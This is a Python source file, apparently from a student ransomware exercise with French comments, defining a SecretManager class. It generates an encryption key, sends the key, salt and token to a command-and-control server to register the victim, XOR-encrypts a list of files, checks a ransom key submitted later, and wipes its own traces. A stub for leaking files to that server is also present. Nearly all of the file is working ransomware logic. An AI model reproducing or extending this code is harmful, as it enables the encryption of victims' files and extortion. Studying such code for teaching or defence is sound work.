from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

from xorcrypt import xorfile

class SecretManager:

    

    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # Dérivation de la clé à partir du sel et de la clé
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(), 
            length=self.KEY_LENGTH, 
            salt=salt, 
            iterations=self.ITERATION,
            backend = default_backend()
        )
        derived_key = kdf.derive(key) # dérivation de la clé
        return derived_key # retoune la clé dérivée
        

    def create(self)->Tuple[bytes, bytes, bytes]:
        salt = secrets.token_bytes(self.SALT_LENGTH) # génération d'un sel aléatoire
        key = secrets.token_bytes(self.KEY_LENGTH) # génération d'une clé aléatoire
        token = self.do_derivation(salt, key) # génération du jeton à partir du sel et de la clé
        return salt, key, token # retourne le sel, la clé et le jeton
        

    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")


    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        url = f"http://{self._remote_host_port}/new" # création de l'url
        # création du dictionnaire contenant les données à envoyer en base64
        data = { 
        "token" : self.bin_to_b64(token),
        "salt" : self.bin_to_b64(salt),
        "key" : self.bin_to_b64(key)}
        # envoi de la requête
        response = requests.post(url, json=data) 
        # vérification du status de la requête
        if response.status_code != 200:
            self._log.error(f"Echec de l'envoi : {response.text}")
        else:
            self._log.info("Envoi reussi")
        

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        # vérification de l'existence d'un fichier self._token.bin
        if os.path.exists(os.path.join(self._path, "token.bin")) or os.path.exists(os.path.join(self._path, "salt.bin")):
            raise FileExistsError("Les données de chiffrement existent déjà")

        # création des données de chiffrement
        self._salt, self._key, self._token = self.create()

        # création du dossier de stockage des données de chiffrement
        os.makedirs(self._path, exist_ok=True)

        # sauvegarde des données de chiffrement dans des fichiers
        with open(os.path.join(self._path, "salt.bin"), "wb") as salt_f:
            salt_f.write(self._salt)
        with open(os.path.join(self._path, "token.bin"), "wb") as token_f:
            token_f.write(self._token)
        
        # envoi des données de chiffrement au cnc
        self.post_new(self._salt, self._key, self._token)


    def load(self)->None:
        # function to load crypto data
        # chargement des données de chiffrement
        salt_path = os.path.join(self._path, "salt.bin")
        token_path = os.path.join(self._path, "token.bin")

        # vérification de l'existence des fichiers de données de chiffrement
        if os.path.exists(salt_path) and os.path.exists(token_path):
            # chargement des données de chiffrement
            with open(salt_path, "rb") as salt_f:
                self._salt = salt_f.read()
            with open(token_path, "rb") as token_f:
                self._token = token_f.read()
        else:
            self._log.info("Les données de chiffrement n'existent pas")
       
            
            
    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        # vérification de la clé
        # génération du jeton à partir du sel et de la clé candidate
        token = self.do_derivation(self._salt, candidate_key)
        return token == self._token


    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        # déchffrement de la clé candidate en base64
        test_key = base64.b64decode(b64_key)
        # vérification de la clé candidate déchiffrée
        if self.check_key(test_key):
            self._key = test_key
            self._log.info("Clé valide")
        else:
            raise ValueError("Clé invalide")
        

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        #Hacher le token en sha256 et le convertir en hexadécimal
        hashed_token = sha256(self._token).hexdigest()
        return hashed_token
    

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        #self._log.info(files)
        for f_path in files:
            try:
                xorfile(f_path, self._key)
                self._log.info(f"Chiffrement de {f_path} réussi")
            except Exception as erreur:
                self._log.error(f"Erreur pednant le chiffrement {f_path}: {erreur}")


    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        return NotImplemented()


    def clean(self):
        # remove crypto data from the target
        # suppression des données de chiffrement
        salt_path = os.path.join(self._path, "salt.bin")
        token_path = os.path.join(self._path, "token.bin")

        try:  
            # suppression du fichier de sel s'il existe
            if os.path.exists(salt_path):
                os.remove(salt_path) 
                self._log.info("Fichier de sel supprimé")
            else:
                self._log.info("Fichier de sel inexistant")
        
        except Exception as erreur:
            self._log.error(f"Erreur pendant la suppression du fichier de sel: {erreur}")
            
        try:
            # suppression du fichier de jeton s'il existe
            if os.path.exists(token_path):
                os.remove(token_path)
                self._log.info("Fichier de jeton supprimé")
            else:
                self._log.info("Fichier de jeton inexistant")
    
        except Exception as erreur:
            self._log.error(f"Erreur pendant la suppression du fichier de jeton: {erreur}")
            
        # clear in memory data
        self._salt = None
        self._key = None
        self._token = None